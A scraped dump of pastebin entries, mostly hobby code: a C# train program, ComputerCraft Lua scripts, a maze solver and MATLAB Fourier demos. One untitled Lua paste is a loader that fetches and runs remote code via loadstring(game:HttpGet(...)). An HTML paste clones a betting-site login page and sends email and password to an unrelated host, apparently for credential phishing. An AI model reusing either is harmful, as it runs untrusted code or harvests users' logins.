                _countRailwayСarriages = CreateRailwayСarriage(_tickets);

                Train train = new Train(_countRailwayСarriages, _direction);
                Console.WriteLine(""Сформирован поезд\n"");

                train.ShowInfo();

                while (continueThisMenu)
                {
                    Console.WriteLine(""\n1) Отправить поезд\n2) Продать еще билетов на рейс"");
                    Console.Write(""Выбирете пункт меню: "");
                    string indexOption = Console.ReadLine();
                    
                    switch (indexOption)
                    {
                        case SendTrainCommand:
                            continueThisMenu = DepartureTrain();
                            break;

                        case BuyAdditionalTicketsCommand:
                            BuyAdditionalTickets();
                            break;
                    }
                }
            }    
        }
    }

    class RoadMap
    {
        public RoadMap(string pointA, string pointB)
        {
            PointA = pointA;
            PointB = pointB;
        }

        public string PointA { get; }
        public string PointB { get; }
    }

    class RailwayСarriage
    {
        private int _seats = 50;

        public int SeatsCount => _seats;
    }

    class Train
    {
        private int _carriagesCount;

        private RoadMap _roadMap;

        public Train(int carriagesCount, RoadMap roadMap)
        {
            _carriagesCount = carriagesCount;
            _roadMap = roadMap;
        }

        public void ShowInfo()
        {
            if (_roadMap != null)
            {
                Console.WriteLine($""Текущее выбранное напрвление - {_roadMap.PointA} : {_roadMap.PointB}"");

                Console.WriteLine($""Текущее количество вагонов: {_carriagesCount}"");
            }
        }
    }

    class RoadMapGenerator
    {
        public List <RoadMap> Create()
        {
            List<RoadMap> roadMaps = new List<RoadMap>();

            roadMaps.Add(new RoadMap(""Туапсе"", ""Краснодар""));
            roadMaps.Add(new RoadMap(""Ростов-На-Дону"", ""Адлер""));
            roadMaps.Add(new RoadMap(""Москва"", ""Питер""));
            roadMaps.Add(new RoadMap(""Адлер"", ""Владивосток""));
            roadMaps.Add(new RoadMap(""Челябинск"", ""Екатеринбург""));
            roadMaps.Add(new RoadMap(""Томск"", ""Тюмень""));
            roadMaps.Add(new RoadMap(""Грозный"", ""Махачкала""));
            roadMaps.Add(new RoadMap(""Нальчик"", ""Черкесск""));

            return roadMaps;
        }
    }
}"
GULmuMXa,twitch.tv - Remove cookie wall,EdFrees,CSS,Sunday 9th of July 2023 01:42:36 PM CDT,".consent-banner {
    display: none !important;
}"
3V1e5XLS,onzOS 2.0 Terminal,PolskiWisnia,Lua,Sunday 9th of July 2023 01:35:44 PM CDT,"local function aw(...) return write(...) end
local function p(...) return print(...) end
local function s(...) return sleep(...) end
local function tw(...) return term.write(...) end
local function scp(...) return term.setCursorPos(...) end
local function sbc(...) return term.setBackgroundColor(...) end
local function stc(...) return term.setTextColor(...) end
local function tc(...) return term.clear(...) end
local function tcl(...) return term.clearLine(...) end
local function r(...) return shell.run(...) end
local function sp(...) return textutils.slowPrint(...) end
local function sw(...) return textutils.slowWrite(...) end
local function fse(...) return fs.exists(...) end
local function pul(...) return paintutils.loadImage(...) end
local function pud(...) return paintutils.drawImage(...) end
local function pfb(...) return paintutils.drawFilledBox(...) end
local function su(...) return os.shutdown(...) end
local function re(...) return os.reboot(...) end
local function pdp(...) return paintutils.drawPixel(...) end
 
w, h = term.getSize()
function retrieve_protocol()
    local prot = fs.open("".prot"", ""r"")
    protocol = prot.readLine()
    prot.close()
    return protocol
end

function drawUI(user)
    pfb(1,1,w,h,colors.black)
    pdp(w-1,h,colors.red)
    pdp(w,h,colors.orange)
    pfb(1,1,w,1,colors.blue)
    stc(colors.white)
    scp(1,1)
    p(""onzOS 2.0 Voting Terminal"")
    scp(1,h-1)
    p(""Zalogowany uzytkownik: "", user)
end

function vote()
    protokol = retrieve_protocol()
    rednet.open(""back"")
    local senderId, temat, protocol = rednet.receive(""onzOS"")
    sbc(colors.black)
    stc(colors.white)
    scp(1,2)
	p("""")
    p(temat)
	p("""")
    p[[Zaglosuj nad powyzszym wnioskiem:
1. Tak
2. Nie
3. Wstrzymuje sie]]
    p[[UWAGA! Od pojawienia sie tego powiadomienia masz 60 sekund na wyslanie odpowiedzi! Program przyjmuje tylko argumenty 1/2/3. Odpowiedz wyslana po 60 sekundach nie zostanie policzona.]]
    write("".>"")
    odpowiedz = read()
    rednet.broadcast(odpowiedz, protokol)
    tc()
    scp(1,1)
    p[[Odpowiedz zostala wyslana.]]
    s(10)
	system(user)
end

function login()
     local pass = fs.open("".pass"", ""r"")
     user = pass.readLine()
     password = pass.readLine()
     pass.close()
     a = math.floor(h/3)
     pfb(1,1,w,a-2,colors.blue)
     pfb(1,a-1,w,2*a, colors.cyan)
     pfb(1,2*a+1,w,h,colors.blue)
     scp(1,a+1)
     sbc(colors.cyan)
     stc(colors.white)
     p(""Terminal onzOS 2.0. Uzytkownik: "", user)
     write("".>"")
     has = read(""*"")
     if password == has then system(user)
     else p(""Bledne haslo!"") s(1) re() end
end
            
function system(user)
	while true do
    drawUI(user)
    vote()
	end
end

login()"
ckFgU8wF,Twitch Chat,FeelsKjeldMan,Lua,Sunday 9th of July 2023 12:21:41 PM CDT,"-- Usage: > twitch_chat.lua <channel1> <channel2> <channel3> ...

local tmi = require(""tmi"") -- https://pastebin.com/nve0x72X

local Client = tmi.connect({
    -- identity = { -- Optional
    --     username = ""YourUserName"",
    --     password = ""oauth:token""
    -- },
    channels = { ... }, -- List of channels to connect to
})

local function writeCol(dev, color, text)
    dev.setTextColor(color)
    dev.write(text)
end

-- Emitted when joining a chat
Client.listen(""ROOMSTATE"", function(channel, modes, tags)
    writeCol(term, colors.white, ""Joined "")
    writeCol(term, colors.magenta, channel)
    writeCol(term, colors.white, ""'s chat"")
	local monitor = peripheral.find(""monitor"")
	monitor.clear();
    print()
	
end)

-- Emitted every chat message
Client.listen(""CHAT"", function(channel, username, message, tags, isSelf)
    if #Client.channels > 1 then
	    writeCol(term, colors.magenta, ""#"" .. channel)
	    writeCol(term, colors.white, "" - "")
    end
	x = 1;

	local monitor = peripheral.find(""monitor"")
	scale = monitor.getTextScale()
	monitor.setTextScale(scale)
	monitor.setCursorPos(x, 1)
    writeCol(term, colors.orange, username)
    writeCol(term, colors.white, "": "")
	monitor.write(username)
	monitor.write("": "")
	monitor.write(message)
    print(message)
end)

while true do
    local event, key = tmi.tick(os.pullEventRaw())
    if event == ""terminate"" then
        Client.disconnect()
        break
    end
end

-- List of event callbacks
--- ""ACTION"" -> function(channel, username, actionMessage, tags, isSelf)
--- ""ANONGIFTPAIDUPGRADE"" -> function(channel, username, tags)
--- ""ANONSUBGIFT"" -> function(channel, streak, recipient, tier, tags)
--- ""ANONSUBMYSTERYGIFT"" -> function(channel, giftSubCount, tier, tags)
--- ""BAN"" -> function(channel, username, tags)
--- ""CHAT"" -> function(channel, username, message, tags, isSelf)
--- ""CHEER"" -> function(channel, username, bits, message, tags)
--- ""CLEARCHAT"" -> function(channel, tags)
--- ""CLOSED"" -> function(reason)
--- ""FAILURE"" -> function(reason)
--- ""GIFTPAIDUPGRADE"" -> function(channel, username, gifter, tags)
--- ""GLOBALUSERSTATE"" -> function(username, tags)
--- ""HOST"" -> function(channel, target, viewers)
--- ""HOSTED"" -> function(channel, name, autohost)
--- ""MESSAGEDELETED"" -> function(channel, username, message, tags)
--- ""NEWCHATTER"" -> function(channel, username, message, tags)
--- ""NOTICE"" -> function(channel, message, tags)
--- ""PING"" -> function()
--- ""PRIMEPAIDUPGRADE"" -> function(channel, username, tier, tags)
--- ""RAID"" -> function(channel, username, viewers, tags)
--- ""RAW"" -> function(line)
--- ""REDEEM"" -> function(channel, username, reward_id, message, tags)
--- ""RESUB"" -> function(channel, username, streak, tier, message, tags)
--- ""RITUAL"" -> function(channel, ritualName, username, message, tags)
--- ""ROOMSTATE"" -> function(channel, modes, tags)
--- ""SUB"" -> function(channel, username, tier, message, tags)
--- ""SUBGIFT"" -> function(channel, username, streak, recipient, tier, tags)
--- ""SUBMYSTERYGIFT"" -> function(channel, username, giftSubCount, tier, tags)
--- ""TIMEOUT"" -> function(channel, username, duration, tags)
--- ""UNHOST"" -> function(channel, viewers)
--- ""USERNOTICE"" -> function(channel, msgId, message, tags)
--- ""USERSTATE"" -> function(channel, tags)
--- ""WHISPER"" -> function(username, message, tags)"
CdBgw5rg,Dadosjogo,Lipemm23,HTML,Sunday 9th of July 2023 12:13:56 PM CDT,"<html lang=""en"">
 <head> 
  <meta charset=""utf-8""> 
  <meta name=""viewport"" content=""width=device-width, initial-scale=1""> 
  <!-- CSRF Token --> 
  <meta name=""csrf-token"" content=""nZlYmdjrgQrKO4dXw8X7k48TrM6Zk53nsZN7EC69""> 
  <title>BETFIRE</title> 
  <!-- Fonts --> 
  <link rel=""dns-prefetch"" href=""//fonts.bunny.net""> 
  <link href=""https://fonts.bunny.net/css?family=Nunito"" rel=""stylesheet""> 
  <style>
        /* Apply the colors dynamically */
        :root {
            --primary-color: #000000      !important;
            --secondary-color: #000000      !important;
            --tertiary-color: #e1b008      !important;
            --button-color: #e1b008     !important;
            --notices-color: #000000      !important;
            /* Add other color variables as needed */
        }
    </style> 
  <!-- Scripts --> 
  <link rel=""icon"" type=""image/png"" href=""https://i.ibb.co/mChf7fj/IMG-20230708-WA0022-removebg-preview.png"" sizes=""32x32""> 
  <link rel=""apple-touch-icon"" sizes=""180x180"" href=""/storage/company-27-favicon-1687441514.png""> 
  <link rel=""preload"" as=""style"" href=""https://app.betserver.site/build/assets/app-5950027b.css"">
  <link rel=""preload"" as=""style"" href=""https://app.betserver.site/build/assets/splide.min-a75702c1.css"">
  <link rel=""preload"" as=""style"" href=""https://app.betserver.site/build/assets/style-5c56c5e4.css"">
  <link rel=""modulepreload"" href=""https://app.betserver.site/build/assets/app-0bf372e6.js"">
  <link rel=""stylesheet"" href=""https://app.betserver.site/build/assets/app-5950027b.css"">
  <link rel=""stylesheet"" href=""https://app.betserver.site/build/assets/splide.min-a75702c1.css"">
  <link rel=""stylesheet"" href=""https://app.betserver.site/build/assets/style-5c56c5e4.css""> 
  <!-- Web Application Manifest --> 
  <link rel=""manifest"" href=""https://pastebin.com/raw/VXdC576n""> 
  <!-- Chrome for Android theme color --> 
  <meta name=""theme-color"" content=""#282834FF""> 
  <!-- Add to homescreen for Chrome on Android --> 
  <meta name=""mobile-web-app-capable"" content=""yes""> 
  <meta name=""application-name"" content=""slotsbet""> 
  <link rel=""icon"" sizes=""512x512"" href=""/storage/company-19-favicon-1687540092.png""> 
  <!-- Add to homescreen for Safari on iOS --> 
  <meta name=""apple-mobile-web-app-capable"" content=""yes""> 
  <meta name=""apple-mobile-web-app-status-bar-style"" content=""black""> 
  <meta name=""apple-mobile-web-app-title"" content=""slotsbet""> 
  <link rel=""apple-touch-icon"" href=""/storage/company-19-favicon-1687540092.png""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 621px) and (device-height: 1104px) and (-webkit-device-pixel-ratio: 3)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <link href=""/storage/company-19-favicon-1687540092.png"" media=""(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2)"" rel=""apple-touch-startup-image""> 
  <!-- Tile for Win8 --> 
  <meta name=""msapplication-TileColor"" content=""#e1b008""> 
  <meta name=""msapplication-TileImage"" content=""https://i.ibb.co/mChf7fj/IMG-20230708-WA0022-removebg-preview.png""> 
  <script type=""text/javascript"">
    // Initialize the service worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/serviceworker.js', {
            scope: '.'
        }).then(function (registration) {
            // Registration was successful
            console.log('Laravel PWA: ServiceWorker registration successful with scope: ', registration.scope);
        }, function (err) {
            // registration failed :(
            console.log('Laravel PWA: ServiceWorker registration failed: ', err);
        });
    }
</script> 
 </head> 
 <body class=""bg-white dark-mode-active""> 
  <div id=""app""> 
   <div id=""appCapsule"" class=""pt-0""> 
    <div class=""login-form mt-1 d-flex justify-content-center gap-5 flex-column"" style=""height: 90vh""> 
     <div class=""section mt-1""> 
      <img src=""https://i.ibb.co/mChf7fj/IMG-20230708-WA0022-removebg-preview.png"" alt=""image"" class=""form-image""> 
      <h2 class=""text-white mt-4"">Login</h2> 
     </div> 
     <div class=""section mt-1 mb-5 d-flex justify-content-center align-items-center""> 
      <form action=""https://dev-projeto2023.pantheonsite.io/projeto%20bala/NewFolder/TELA02.html"" class=""w-100""> 
       <input type=""hidden"" name=""_token"" value=""nZlYmdjrgQrKO4dXw8X7k48TrM6Zk53nsZN7EC69""> 
       <div class=""form-group boxed""> 
        <div class=""input-wrapper""> 
         <input type=""email"" class=""form-control login-input-control "" id=""email1"" name=""email"" placeholder=""E-mail""> 
         <i class=""clear-input""> 
          <ion-icon name=""close-circle""></ion-icon> </i> 
        </div> 
       </div> 
       <div class=""form-group boxed""> 
        <div class=""input-wrapper""> 
         <input type=""password"" class=""form-control login-input-control "" id=""password1"" name=""password"" placeholder=""Senha"" autocomplete=""off""> 
         <i class=""clear-input""> 
          <ion-icon name=""close-circle""></ion-icon> </i> 
        </div> 
       </div> 
       <div class=""""> 
        <button type=""submit"" class=""btn btn-primary btn-block btn-lg "" style=""height: 60px !important;""> Acessar </button> 
       </div> 
       <div class=""mt-4""> 
        <p class=""fw-bolder""><span class=""text-white"">Precisa de Ajuda?</span> <a target=""_blank"">Clique aqui</a></p> 
       </div> 
      </form> 
     </div> 
    </div> 
   </div> 
  </div> 
 </body>
</html>"
VXdC576n,Iconemeni,Lipemm23,JSON,Sunday 9th of July 2023 12:12:37 PM CDT,"{
    ""nome"": ""Slotsbet"",
    ""short_name"": ""Slotsbet"",
    ""start_url"": ""https://app.betserver.site/slotsbet"",
    ""exibir"": ""autônomo"",
    ""theme_color"": ""#282834FF"",
    ""background_color"": ""#0C1624FF"",
    ""orientação"": ""qualquer"",
    ""status_bar"": ""preto"",
    ""respingo"": {
        ""640x1136"": ""/storage/company-27-favicon-1687441514.png"",
        ""750x1334"": ""/storage/company-27-favicon-1687441514.png"",
        ""828x1792"": ""/storage/company-27-favicon-1687441514.png"",
        ""1125x2436"": ""/storage/company-27-favicon-1687441514.png"",
        ""1242x2208"": ""/storage/company-27-favicon-1687441514.png"",
        ""1242x2688"": ""/storage/company-27-favicon-1687441514.png"",
        ""1536x2048"": ""/storage/company-27-favicon-1687441514.png"",
        ""1668x2224"": ""/storage/company-27-favicon-1687441514.png"",
        ""1668x2388"": ""/storage/company-27-favicon-1687441514.png"",
        ""2048x2732"": ""/storage/company-27-favicon-1687441514.png""
    },
    ""ícones"": [
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""72x72"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""96x96"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""128x128"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""144x144"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""152x152"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""192x192"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""384x384"",
            ""propósito"": ""qualquer""
        },
        {
            ""src"": ""/storage/company-27-favicon-1687441514.png"",
            ""tipo"": ""imagem\/png"",
            ""tamanhos"": ""512x512"",
            ""propósito"": ""qualquer""
        }
    ]
}"
AxyZfags,Untitled,G_CODEXG,Lua,Sunday 9th of July 2023 11:50:22 AM CDT,"loadstring(game:HttpGet((""https://pastebin.com/UKF4WX4P""),true))()"
nWLZHVJk,Streamer Monitor Display,FeelsKjeldMan,Lua,Sunday 9th of July 2023 11:44:05 AM CDT,"-- Written By Bacon_Donut
-- http://twitch.tv/bacon_donut
-- API call updated by @darkgoldblade on twitter
-- Follower name added by @coolacid

-- View all my public pastebin codes at:
-- http://pastebin.com/u/bacon_donut

-- This is formatted to fit on a 1x3 wall of Advanced Monitors
-- with an Advanced Computer on the left side.
-- To get this to work you need to edit the streamid variable then run these four commands:

-- label set SomeKindOfNameHere
-- pastebin get 4nRg9CHU json
-- pastebin get vhn1z23v startup
-- startup

-- Twitch Name of the Streamer
streamid = ""FeelsKjeldMan""


-- SleepTime is how often to grab new data. Set here to one minute.
-- Set it too fast and twitch will flag you for spam
-- and stop giving you data
SleepTime = 60


os.loadAPI(""json"")
local m = peripheral.wrap(""right"")
m.setCursorPos(1,1)

function getFollower()
       
        str = http.get(""https://api.twitch.tv/kraken/channels/"" .. streamid .. ""/follows?limit=1"").readAll()
        obj = json.decode(str)
        follower = json.encodePretty(obj.follows[1].user.name)
       
        m.setCursorPos(1,5)    
        m.write(""Last Follow: "")
        m.write(follower)
 
        return follows
end

function getFollowers()
	
	str = http.get(""https://api.twitch.tv/kraken/channels/"" .. streamid .. ""/follows"").readAll()
	obj = json.decode(str)
	follows = json.encodePretty(obj._total)
	
	m.setCursorPos(1,3)	
	m.write(""Twitch Followers: "")
	m.write(follows)

	return follows
end

function getViewerCount()
	lstr = http.get(""https://api.twitch.tv/kraken/streams/"" .. streamid).readAll()
        lobj = json.decode(lstr)
	
        m.setCursorPos(1,1)
	

	if live == ""\""0\"""" then
		m.write(streamid)
		m.setCursorPos(1,4)
		m.write(""Live Viewers: Offline"")
	else
		live = json.encodePretty(lobj.stream.viewers)
		m.setBackgroundColor(colors.yellow)
		m.clear()
		m.write(streamid)
		m.setCursorPos(1,4)
		m.write(""Live Viewers: "")
		m.write(live)		
	end

	return live
end

while true do
	m.setCursorPos(1,1)
	m.setBackgroundColor(colors.white)
	m.setTextColor(colors.blue)
	m.setTextScale(1)
	m.clear()

	m.write(streamid)
	m.setCursorPos(1,2)

	local status, live = pcall(function () getViewerCount() end)
	
	if status then
		-- do nothing
	else
		m.setCursorPos(1,4)
		m.write(""Live Viewers: Loading..."")
	end

	local status, followsCount = pcall(function () getFollowers() end)
	
	m.setCursorPos(1,3)	

	if status then		
		-- do nothing
	else	
	
		m.write(""Twitch Follows: Loading..."")
	end

        local status, followsCount = pcall(function () getFollower() end)
       
        if status then
                -- do nothing
        else
                m.write(""Last Follow: Loading..."")
        end

	

	sleep(SleepTime)
end"
2LV9VQnz,Maze Challenge: Heuristic custom BFS,WarPie90,Delphi,Sunday 9th of July 2023 11:36:46 AM CDT,"program MazeSolver;
{$I SRL/OSR.simba}
{$R-}


// home brewed search structure for the heuristic BFS lookup
// maintains order. High cost of insertion O(n).
type
  TPathStruct = record
    node: TPoint;
    hdist: Double;
    rdist: Double;
  end;

  TSearchArray = record
    lo, hi: Int32;
    data: array of TPathStruct;
  end;


procedure TSearchArray.Init(sz: Int32);
begin
  SetLength(Self.data, sz);

  Self.hi := -1;
  Self.lo := 0;
end;

// find the current value or the closest value in the array.
// Time complexity: O(log n)
function TSearchArray.SearchClosest(value: Double): Int32;
var
  l, h: Int32;
begin
  l := Self.Lo;
  h := Self.Hi;

  while l <= h do
  begin
    Result := (l + h) div 2;
    if Self.Data[Result].hdist < value then
      h := Result - 1
    else if Self.Data[Result].hdist > value then
      l := Result + 1
    else
      Exit(Result);
  end;
end;

// Insert the a value into it's correct position by searching. 
// Time complexity: O(n)
function TSearchArray.Insert(node:TPoint; hdist, rdist: Double): Int32;
var
  idx,i: Int32;
begin
  idx := Self.SearchClosest(hdist);
  if Self.Data[idx].hdist > hdist then Inc(idx);

  if (self.hi+1-idx) > 0 then
    Move(Self.data[idx], Self.data[idx+1], (self.hi+1-idx)*(SizeOf(TPathStruct)));

  Self.data[idx].hdist := hdist;
  Self.data[idx].rdist := rdist;
  Self.data[idx].node  := node;

  Inc(Self.hi);
end;

// Pop the largest or smallest value depending on insertion order 
// Time complexity: O(1) 
procedure TSearchArray.Pop(out node:TPoint; out hdist, rdist: Double);
begin
  node  := self.data[self.hi].node;
  hdist := self.data[self.hi].hdist;
  rdist := self.data[self.hi].rdist;

  Dec(Self.Hi);
end;

function TSearchArray.AsString(): String;
var
  tmp: array of TPathStruct;
begin
  tmp := self.data;
  SetLength(tmp, self.hi+1);
  Result := ToString(tmp);
end;


procedure GetAdjacent(var adj:TPointArray; n:TPoint; EightWay:Boolean);
begin
  adj[0] := Point(n.x-1,n.y);
  adj[1] := Point(n.x,n.y-1);
  adj[2] := Point(n.x+1,n.y);
  adj[3] := Point(n.x,n.y+1);
  if EightWay then
  begin
    adj[4] := Point(n.x-1,n.y-1);
    adj[5] := Point(n.x+1,n.y+1);
    adj[6] := Point(n.x-1,n.y+1);
    adj[7] := Point(n.x+1,n.y-1);
  end;
end;


function SolveMaze(Start, Stop: TPoint; Img: TMufasaBitmap): TPointArray;
var
  score,hdist: Double;
  i,w,h: Int32;
  arr: TSearchArray;
  map: TSingleMatrix;
  adj: TPointArray;
  p,q: TPoint;

  bmp: TMufasaBitmap;
begin
  SetLength(adj, 4);
  arr.Init(img.GetWidth() * img.GetHeight());
  arr.Insert(start, Sqrt(Sqr(start.x-stop.x)+Sqr(start.y-stop.y))*4, 0);

  w := img.GetWidth() - 1;
  h := img.GetHeight() - 1;

  map.SetSize(w+1, h+1);

  // heuristical forward search for goal
  while arr.hi >= 0 do
  begin
    arr.Pop(p, hdist, score);
    if Distance(p, stop) < 1 then break;
    GetAdjacent(adj, p, Length(adj)=8);
    for q in adj do
      if InRange(q.x, 0, w) and InRange(q.y, 0, h) and
        (img.GetPixel(q.x, q.y) = $FFFFFF)  then
      begin
        img.SetPixel(q.x,q.y, $666666);
        arr.Insert(q, score + Sqrt(Sqr(q.x-stop.x)+Sqr(q.y-stop.y))*4, score+1);
        map[q.y, q.x] := score+1; //<--- for simple backtrace
      end;
  end;

  // backtrace towards 0 distance from stop using the distance map
  // I backtrace 8-way
  SetLength(adj, 8);
  score := map[stop.y,stop.x];
  Result += p;
  while score > 1 do
  begin
    GetAdjacent(adj, p, Length(adj)=8);
    for q in adj do
      if InRange(q.x, 0, w) and InRange(q.y, 0, h) and
         (map[q.y, q.x] < score) and (map[q.y, q.x] > 0) then
      begin
        score := map[q.y, q.x];
        p := q;
      end;
    Result += p;
  end;
  Result += start;

  //bmp.Init();
  //bmp.DrawMatrix(map);
  //bmp.Debug();
end;


var
  start := Point(5,0);
  stop  := Point(635,480);

  img, im2: TMufasaBitmap;
  TPA,white,black,path1,path2: TPointArray;
  t:Double;
begin
  img.Init();
  img.LoadFromFile('images\maze.png');

  t := PerformanceTimer;
  begin
    img.FindColors(black, $0);
    img.DrawTPA(black.Grow(2),0);
    path1 := SolveMaze(start, stop, img);
  end;
  WriteLn(PerformanceTimer - t, 'ms');

  WriteLn('Length: ', Length(path1));

  img.DrawClear($FFFFFF);
  img.DrawTPA(black, 0);
  img.DrawTPA(path1,$00FF00);

  img.Debug();
  img.Free();
end."
sZDuTPSm,Fourier Series - Pulse with duty cycle = 0.5,makispaiktis,MatLab,Sunday 9th of July 2023 11:36:25 AM CDT,"clear all
close all
clc

%% 1a. Create a pulse with duty cycle = 0.5
syms t n
tt = linspace(0, 12, 1201);
yy = zeros(1, length(tt));
for i = 1 : length(tt)
    t_ = tt(i);
    if (0<=t_ && t_<=2) || (4<=t_ && t_<=6) || (8<=t_ && t_<=10)
        yy(i) = 1;
    end
end

figure();
plot(tt, yy);
title(""Fourier series"");
xlabel(""t"");
hold on


%% 1b. Find the Fourier series coefficients
T = 4;  f0 = 1/T;   w0  = 2*pi*f0;
N_LIMITS = [10 20 50];
titles = [""Original pulse""];

for index = 1 : length(N_LIMITS)
    
    display('************************************************');
    N_LIMIT = N_LIMITS(index);
    n = 1 : N_LIMIT;
    fprintf('N = %d\n', N_LIMIT);

    a0 = (1/T) * int(1, t, 0, 2)
    an = (2/T) * int(1*cos(n*w0*t), t, 0, 2)
    bn = (2/T) * int(1*sin(n*w0*t), t, 0, 2)

    y_appr = @(t) a0;
    for i = 1 : N_LIMIT
        an_ = an(i);
        bn_ = bn(i);
        n_ = n(i);
        y_appr = y_appr + an_ * cos(n_*w0*t) + bn_ * sin(n_*w0*t);
    end
    fplot(t, y_appr, [0 12]);
    hold on
    titles(end+1) = num2str(N_LIMIT) + ""-terms Fourier series"";
    fprintf('************************************************\n\n');
end

legend(titles);


"
8tGerqCv,Fourier Series - Periodic signal - Sum of sinus waves,makispaiktis,MatLab,Sunday 9th of July 2023 11:35:38 AM CDT,"clear all
close all
clc

%% 1a. Create a periodic signal as the sum of 2 sinus waves
syms t n
STOP = 24;
tt = linspace(0, STOP, 1201);
T1 = 3;     T2 = 2;     A1 = 2.5;   A2= 1.5;
yy = A1*sin(2*pi*tt / T1) + A2*sin(2*pi*tt / T2);

figure();
plot(tt, yy);
title(""Fourier series"");
xlabel(""t"");
hold on


%% 1b. Find the Fourier series coefficients
T = lcm(T1, T2);  f0 = 1/T;   w0  = 2*pi*f0;
N_LIMITS = [10 20 50];
titles = [""Original pulse""];

for index = 1 : length(N_LIMITS)
    
    display('************************************************');
    N_LIMIT = N_LIMITS(index);
    n = 1 : N_LIMIT;
    fprintf('N = %d\n', N_LIMIT);
    
    y = A1*sin(2*pi*t / T1) + A2*sin(2*pi*t / T2);
    a0 = (1/T) * int(y, t, 0, 2)
    an = (2/T) * int(y*cos(n*w0*t), t, 0, 2)
    bn = (2/T) * int(y*sin(n*w0*t), t, 0, 2)

    y_appr = @(t) a0;
    for i = 1 : N_LIMIT
        an_ = an(i);
        bn_ = bn(i);
        n_ = n(i);
        y_appr = y_appr + an_ * cos(n_*w0*t) + bn_ * sin(n_*w0*t);
    end
    fplot(t, y_appr, [0 STOP]);
    hold on
    titles(end+1) = num2str(N_LIMIT) + ""-terms Fourier series"";
    fprintf('************************************************\n\n');
end

legend(titles);


"
TyWBRidz,FFT4 - FD plot when duration!=kT after windowing and padding - Spikes,makispaiktis,MatLab,Sunday 9th of July 2023 11:34:43 AM CDT,"clear all
close all
clc

%% D1. New duration != integer number of signal cycles
Fs = 500;                   % Sampling Frequency   [Hz]
duration = 0.64;            % Signal time duration [sec]
Ts = 1 / Fs;                % Sampling period      [sec]
t = 0 : Ts : duration - Ts;
N = length(t);              % Num of samples 
    

%% D2. Signal parameters - Windowing BEFORE padding
A1 = 3;     f1 = 30;    phase1 = 0.6;
A2 = 2;     f2 = 45;    phase2 = -0.8;
A3 = 1;     f3 = 70;    phase3 = 2;
s1 = A1*cos(2*pi*f1*t + phase1);
s2 = A2*cos(2*pi*f2*t + phase2);
s3 = A3*cos(2*pi*f3*t + phase3);
s = s1 + s2 + s3;

s = s .* hanning(N)';
figure();
plot(t, s);
xlabel('Time [sec]');
ylabel('Amplitude');
title('Time-domain plot - Signal after windowing');




%% C3. Plotting in time-domain - Zero-padding signal 's'
s = [s zeros(1, 2000)];
t_extra = duration : Ts : duration + 1999*Ts;
t = [t t_extra];

figure();
plot(t, s);
xlabel('Time [sec]');
ylabel('Amplitude');
title('Time-domain plot - Windowing and padding');


%% C4. Fast Fourier Transform - Samples
S = fft(s);                     % Also 'N' samples
figure();
plot(abs(S));
xlabel('Samples');
ylabel('Magnitude');
title('Samples-domain plot');


%% C5. Convert samples into frequencies by keeping the LHS of plot
% Side lobes will disappear after having windowed and padded our signal
N2 = length(s);
S_oneside = S(1 : N2/2);
f = Fs * (0 : N2/2 - 1) / N2;
S_meg = abs(S_oneside) / (N2/2);
figure();
plot(f, S_meg);
xlabel('Frequency [Hz]');
ylabel('Amplitude');
title('Frequency-domain plot (Side lobes disappeared with windowing and padding)');"
FzQBgmtd,FFT3 - FD plot when duration!=kT with padding - Main and side lobes,makispaiktis,MatLab,Sunday 9th of July 2023 11:33:07 AM CDT,"clear all
close all
clc

%% C1. New duration != integer number of signal cycles
Fs = 500;                   % Sampling Frequency   [Hz]
duration = 0.64;            % Signal time duration [sec]
Ts = 1 / Fs;                % Sampling period      [sec]
t = 0 : Ts : duration - Ts;
N = length(t);              % Num of samples 
    

%% C2. Signal parameters - Zero padding signal 's'
A1 = 3;     f1 = 30;    phase1 = 0.6;
A2 = 2;     f2 = 45;    phase2 = -0.8;
A3 = 1;     f3 = 70;    phase3 = 2;
s1 = A1*cos(2*pi*f1*t + phase1);
